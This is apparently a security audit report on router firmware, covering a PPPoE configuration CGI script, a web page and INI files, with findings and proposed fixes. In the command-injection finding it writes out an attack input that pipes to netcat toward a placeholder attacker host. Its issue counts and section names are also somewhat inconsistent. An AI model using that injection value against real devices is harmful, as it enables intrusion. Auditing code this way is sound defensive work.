# Router Code Security & Quality Analysis Report

## Executive Summary
Critical security vulnerabilities identified in router configuration management and web interface. Multiple issues including hardcoded credentials, inadequate input validation, command injection risks, and file corruption.

---

## CRITICAL ISSUES

### 1. **Hardcoded PPPoE Credentials** ⚠️ CRITICAL
**File:** `fhcfg/WanCtlCfg.ini` (Lines 13-14)
**Severity:** CRITICAL

```
pppoeUserName=directtest
pppoePwd=directpass
```

**Impact:**
- Credentials visible in plaintext configuration file
- Accessible to any user with filesystem access
- Stored in backup archives unencrypted
- Can be exposed via web interface (pppoe_3bb.asp retrieves and displays them)

**Fix Required:**
- Remove default credentials from configuration
- Implement password hashing or encryption for stored credentials
- Use secure credential storage (e.g., encrypted vault)
- Implement proper credential initialization workflow during setup

---

### 2. **Input Validation - Command Injection Risk** ⚠️ CRITICAL
**File:** `fh/extend/web/cgi-bin/WanConnection` (Lines 5-6, 13-17)
**Severity:** CRITICAL

**Issue:**
```bash
urldecode() {
    echo "$1" | sed 's/%20/ /g; s/%2B/+/g; s/%2F/\//g; s/%40/@/g; s/%26/\&/g; s/%3D/=/g'
}
```

**Problems:**
- Incomplete URL decoding (missing many special characters)
- No validation of username/password format
- No length limits checked
- sed metacharacters (!, @, |, etc.) not escaped - vulnerable to injection via sed delimiters
- No blacklist/whitelist of allowed characters

**Attack Vector:**
```
pppoeUser=user/e echo$(whoami)/
pppoePass=test|nc attacker.com 1234
```

**Fix Required:**
```bash
urldecode() {
    # Use proper URL decoding without sed injection risk
    python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.argv[1]))" "$1" 2>/dev/null || echo ""
}

validate_param() {
    local param="$1"
    # Only allow alphanumeric, dots, hyphens, underscores, @ symbol for email
    if ! echo "$param" | grep -qE "^[a-zA-Z0-9._@-]{1,63}$"; then
        echo ""
        return 1
    fi
    echo "$param"
}

# Apply validation
PPPOE_USER=$(validate_param "$(urldecode "$PPPOE_USER")")
PPPOE_PWD=$(validate_param "$(urldecode "$PPPOE_PWD")")
```

---

### 3. **Inadequate Input Validation** ⚠️ CRITICAL
**File:** `fh/extend/web/cgi-bin/WanConnection` (Lines 19-25)
**Severity:** CRITICAL

**Issue:**
```bash
if [ -z "$PPPOE_USER" ] || [ -z "$PPPOE_PWD" ]; then
    # Only checks for empty, not format/length
fi
```

**Problems:**
- No length validation
- No character set validation
- PPPoE credentials can be extremely long, causing buffer overflows
- No rate limiting on failed attempts
- No logging of authentication attempts

**Fix Required:**
```bash
validate_pppoe_credentials() {
    local user="$1"
    local pwd="$2"
    
    # Check length (RFC allows up to 256 chars, but limit to 128 for safety)
    if [ ${#user} -gt 128 ] || [ ${#pwd} -gt 128 ]; then
        return 1
    fi
    
    # Check for empty
    if [ -z "$user" ] || [ -z "$pwd" ]; then
        return 1
    fi
    
    # Validate characters - only printable ASCII
    if ! echo "$user" | grep -qE "^[[:print:]]{1,128}$"; then
        return 1
    fi
    
    if ! echo "$pwd" | grep -qE "^[[:print:]]{1,128}$"; then
        return 1
    fi
    
    return 0
}
```

---

### 4. **File Corruption - WanCtlCfg.ini** ⚠️ CRITICAL
**File:** `fhcfg/WanCtlCfg.ini` (Lines 84-96)
**Severity:** CRITICAL

**Issue:**
```ini
# Line 84: "ppe=0" (incomplete key)
# Lines 85-91: Duplicate lines from WAN1 section
# Line 96: File ends abruptly - incomplete entry
```

**Corrupted Section:**
```ini
pppoeMaxMRUSize=0
pppoeMaxMTUSize=0
pppoeReset=0
pppoeDNSOverrideAllowed=0
pppoeAutoDisconnectTime=0
pppoeIdleDisconnectTime=0
pppoeWarnDisconnectDelay=0
ppe=0                                    # ← INVALID KEY
pppoeUserName=                           # ← DUPLICATE
pppoePwd=                                # ← DUPLICATE
pppoeServiceName=                        # ← DUPLICATE
pppoeDialPattern=0                       # ← DUPLICATE
pppoeKeepAliveTime=20                    # ← DUPLICATE
pppoeACName=                             # ← DUPLICATE
pppoeRouteProtocolRx=Off                 # ← DUPLICATE
pppoeMaxMRUSize=0
pppoeMaxMTUSize=0
pppoeReset=0
pppoeDNSOverrideAllowed=0
pppoeDe                                  # ← TRUNCATED LINE
```

**Impact:**
- Configuration file is malformed and non-parseable
- WAN3 section is corrupted
- Unknown impact on router behavior
- Backup may be corrupted during archive transfer

**Fix:**
Complete the corrupted WAN2/WAN3 sections with valid structure.

---

## HIGH SEVERITY ISSUES

### 5. **Dangerous killall Command** ⚠️ HIGH
**File:** `fh/extend/web/cgi-bin/WanConnection` (Line 40)
**Severity:** HIGH

**Issue:**
```bash
killall l3mng 2>/dev/null
```

**Problems:**
- killall without full path is dangerous
- No verification that l3mng was successfully killed
- No timeout before restart
- Could kill unintended processes with similar names
- No error handling if kill fails

**Fix:**
```bash
# Safer process termination
if pgrep -x "l3mng" >/dev/null; then
    pkill -f "^/fh/extend/l3mng$" || true
    sleep 2
    if pgrep -x "l3mng" >/dev/null; then
        pkill -9 -f "^/fh/extend/l3mng$" || true
    fi
fi
```

---

### 6. **Insecure Temporary File Usage** ⚠️ HIGH
**File:** `fh/extend/web/cgi-bin/WanConnection` (Lines 36-39)
**Severity:** HIGH

**Issue:**
```bash
awk ... /fhcfg/WanCtlCfg.ini > /tmp/WanCtlCfg.ini.new
if [ -s /tmp/WanCtlCfg.ini.new ]; then
    mv /tmp/WanCtlCfg.ini.new /fhcfg/WanCtlCfg.ini
```

**Problems:**
- Predictable filename in /tmp
- World-writable directory (/tmp)
- No file locking mechanism
- Race condition: file could be modified between write and move
- No permission validation (file could be created with world-readable permissions)

**Fix:**
```bash
# Use secure temporary file creation
TEMP_FILE=$(mktemp /fhcfg/.WanCtlCfg.XXXXXX) || {
    echo "HTTP/1.1 500 Internal Server Error"
    exit 1
}

trap "rm -f '$TEMP_FILE'" EXIT

awk -v user="$PPPOE_USER" -v pwd="$PPPOE_PWD" '
    BEGIN { in_wan0=0 }
    /^#\[WAN0\]/ { in_wan0=1; print; next }
    /^#\[WAN[1-9]\]/ { in_wan0=0 }
    in_wan0 && /^pppoeUserName=/ { print "pppoeUserName=" user; next }
    in_wan0 && /^pppoePwd=/ { print "pppoePwd=" pwd; next }
    { print }
' /fhcfg/WanCtlCfg.ini > "$TEMP_FILE" || {
    echo "HTTP/1.1 500 Internal Server Error"
    exit 1
}

# Verify file integrity before moving
if [ -s "$TEMP_FILE" ]; then
    chmod 600 "$TEMP_FILE"
    mv "$TEMP_FILE" /fhcfg/WanCtlCfg.ini || {
        echo "HTTP/1.1 500 Internal Server Error"
        exit 1
    }
fi
```

---

### 7. **No CSRF Protection** ⚠️ HIGH
**File:** `fh/extend/web/internet/pppoe_3bb.asp`
**Severity:** HIGH

**Issue:**
Form at line 58 has no CSRF token:
```html
<form method="post" name="pppoecfg" id="pppoecfg" action="/goform/WanConnection" onSubmit="return CheckValue()">
```

**Problems:**
- No CSRF token in form
- No referer validation
- Attacker can craft malicious page to change PPPoE credentials
- No same-site cookie attribute visible

**Fix:**
```html
<form method="post" name="pppoecfg" id="pppoecfg" action="/goform/WanConnection" onSubmit="return CheckValue()">
    <input type="hidden" name="csrf_token" value="<% getCsrfToken() %>">
    <!-- rest of form -->
</form>
```

---

### 8. **Credentials Exposed in Web UI** ⚠️ HIGH
**File:** `fh/extend/web/internet/pppoe_3bb.asp` (Lines 26-29)
**Severity:** HIGH

**Issue:**
```javascript
function initValue() {
    var wan_p_n ='<% getCfgGeneral(1, "wan_pppoe_username"); %>';    
    document.getElementById("pppoeUser").value = wan_p_n;
    var wan_p_p ='<% getCfgGeneral(1, "wan_pppoe_password"); %>';
    document.getElementById("pppoePass").value = wan_p_p;
}
```

**Problems:**
- Password visible in page source
- Visible in browser history
- Visible in browser cache
- Visible in HTML (even if obscured by password field)
- No secure credential display mechanism

**Fix:**
```javascript
function initValue() {
    // Don't display password in form
    // Only show masked version
    var wan_p_n = '<% getCfgGeneral(1, "wan_pppoe_username"); %>';
    document.getElementById("pppoeUser").value = wan_p_n;
    
    // Don't populate password field
    // Require user to re-enter password for security
    document.getElementById("pppoePass").value = "";
    
    // Show indicator that password is set
    document.getElementById("pppoePass").placeholder = "••••• (existing password)";
}
```

---

### 9. **Missing Cache Control Headers** ⚠️ HIGH
**File:** `fh/extend/web/internet/pppoe_3bb.asp` (Lines 3-4)
**Severity:** HIGH

**Issue:**
```html
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
```

**Problems:**
- Only HTTP meta tags (not server headers)
- No Cache-Control header
- No Set-Cookie secure flags
- Credentials could be cached by proxy
- Page could be served from browser cache

**Fix:**
Add to HTTP response headers:
```
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
Pragma: no-cache
Expires: 0
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

---

## MEDIUM SEVERITY ISSUES

### 10. **No Error Logging** ⚠️ MEDIUM
**File:** `fh/extend/web/cgi-bin/WanConnection`
**Severity:** MEDIUM

**Issue:**
No logging of configuration changes or errors.

**Fix:**
```bash
LOG_FILE="/var/log/wan_config.log"
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG_FILE" 2>/dev/null
}

log_message "WAN configuration change initiated from ${REMOTE_ADDR:-unknown}"
log_message "Username: $PPPOE_USER (length: ${#PPPOE_USER})"
# (Note: don't log password)
```

---

### 11. **Weak Parameter Extraction** ⚠️ MEDIUM
**File:** `fh/extend/web/cgi-bin/WanConnection` (Lines 9-11)
**Severity:** MEDIUM

**Issue:**
```bash
extract_param() {
    echo "$FORM_DATA" | grep -o "$1=[^&]*" | cut -d= -f2- | head -1
}
```

**Problems:**
- Regex in grep could match partial parameter names
- No escaping of grep pattern
- Example: `pppoeUser=test&pppoeUserExtra=foo` would match both

**Fix:**
```bash
extract_param() {
    local param="$1"
    echo "$FORM_DATA" | grep -oE "(^|&)$param=[^&]*" | cut -d= -f2- | head -1
}
```

---

### 12. **Incomplete Backup File Format** ⚠️ MEDIUM
**File:** `fhcfg/WanCtlCfg.ini.bak`
**Severity:** MEDIUM

**Issue:**
Line 27: `cp /fhcfg/WanCtlCfg.ini /fhcfg/WanCtlCfg.ini.bak`

**Problems:**
- Backup creates plaintext copies of configuration with credentials
- Multiple backups could accumulate
- No rotation policy visible
- Backups not encrypted

**Fix:**
```bash
# Use atomic operations with proper permissions
if [ -f /fhcfg/WanCtlCfg.ini ]; then
    cp /fhcfg/WanCtlCfg.ini /fhcfg/.WanCtlCfg.bak.tmp
    chmod 600 /fhcfg/.WanCtlCfg.bak.tmp
    mv /fhcfg/.WanCtlCfg.bak.tmp /fhcfg/WanCtlCfg.ini.bak
fi
```

---

### 13. **No HTTP Status Code for Content-Type Header** ⚠️ MEDIUM
**File:** `fh/extend/web/cgi-bin/WanConnection` (Lines 20-24, 48-50)
**Severity:** MEDIUM

**Issue:**
HTML response has no Content-Length header, which could cause issues.

**Fix:**
```bash
output_response() {
    local status="$1"
    local body="$2"
    
    echo "HTTP/1.1 $status"
    echo "Content-Type: text/html; charset=utf-8"
    echo "Content-Length: ${#body}"
    echo "Cache-Control: no-store, no-cache"
    echo ""
    echo "$body"
}
```

---

### 14. **Duplicate Configuration Entries** ⚠️ MEDIUM
**File:** `fhcfg/WanCtlCfg.ini` (Lines 84-96)
**Severity:** MEDIUM

**Issue:**
WAN2 section contains duplicate entries from WAN1.

**Impact:**
- Configuration parsing may fail or produce unpredictable results
- Unknown which value is used by the router
- File corruption during update

---

### 15. **No Rate Limiting** ⚠️ MEDIUM
**File:** `fh/extend/web/cgi-bin/WanConnection`
**Severity:** MEDIUM

**Issue:**
No protection against brute force or DoS attacks on configuration endpoint.

**Fix:**
```bash
# Implement simple rate limiting
RATE_LIMIT_FILE="/tmp/wan_config_rate_${REMOTE_ADDR}.limit"
RATE_LIMIT_COUNT=5
RATE_LIMIT_WINDOW=300  # 5 minutes

check_rate_limit() {
    local now=$(date +%s)
    local limit_file="$RATE_LIMIT_FILE"
    
    if [ -f "$limit_file" ]; then
        local timestamp=$(cat "$limit_file" | cut -d: -f1)
        local count=$(cat "$limit_file" | cut -d: -f2)
        
        if [ $((now - timestamp)) -lt $RATE_LIMIT_WINDOW ]; then
            if [ "$count" -ge "$RATE_LIMIT_COUNT" ]; then
                return 1
            fi
            echo "$timestamp:$((count + 1))" > "$limit_file"
        else
            echo "$now:1" > "$limit_file"
        fi
    else
        echo "$now:1" > "$limit_file"
    fi
    return 0
}
```

---

## CONFIGURATION ISSUES

### 16. **Weak DHCP Configuration** ⚠️ MEDIUM
**File:** `DhcpServerParaCfg.ini` (Line 4-5)
**Severity:** MEDIUM

**Issue:**
DNS points to router itself: `dhcpPriDns=192.168.1.1`

**Problems:**
- Router must provide DNS services or recursion
- No fallback DNS server configured (line 22 empty)
- Could lead to DNS resolution failures

**Fix:**
```ini
dhcpPriDns=8.8.8.8
dhcpSecDns=8.8.4.4
```

---

### 17. **DHCP Lease Time Too Long** ⚠️ LOW
**File:** `DhcpServerParaCfg.ini` (Line 15)
**Severity:** LOW

**Issue:**
`Leasetime=7200` (2 hours)

**Recommended:** Use shorter lease time (30 minutes to 1 hour) for better IP management.

---

## SUMMARY OF ISSUES

| Severity | Count | Issues |
|----------|-------|--------|
| CRITICAL | 4 | Hardcoded credentials, Command injection, Input validation, File corruption |
| HIGH | 5 | Dangerous killall, Temp file race condition, CSRF, Exposed credentials, Missing headers |
| MEDIUM | 6 | No logging, Weak parsing, Backup encryption, HTTP headers, Duplicates, Rate limiting |
| LOW | 1 | DHCP config, Lease time |

**Total Issues Found: 17**

---

## REMEDIATION PRIORITY

1. **URGENT (Within 24 hours):**
   - Remove hardcoded credentials
   - Fix file corruption in WanCtlCfg.ini
   - Implement proper input validation and command injection prevention
   - Add CSRF protection

2. **HIGH (Within 1 week):**
   - Fix killall command
   - Implement secure temp file handling
   - Add cache control headers
   - Stop exposing credentials in web UI

3. **MEDIUM (Within 2 weeks):**
   - Add logging
   - Implement rate limiting
   - Fix parameter extraction
   - Improve backup security

---

## IMPLEMENTATION GUIDE

See the fixed versions of each file in the next section for complete corrected code.
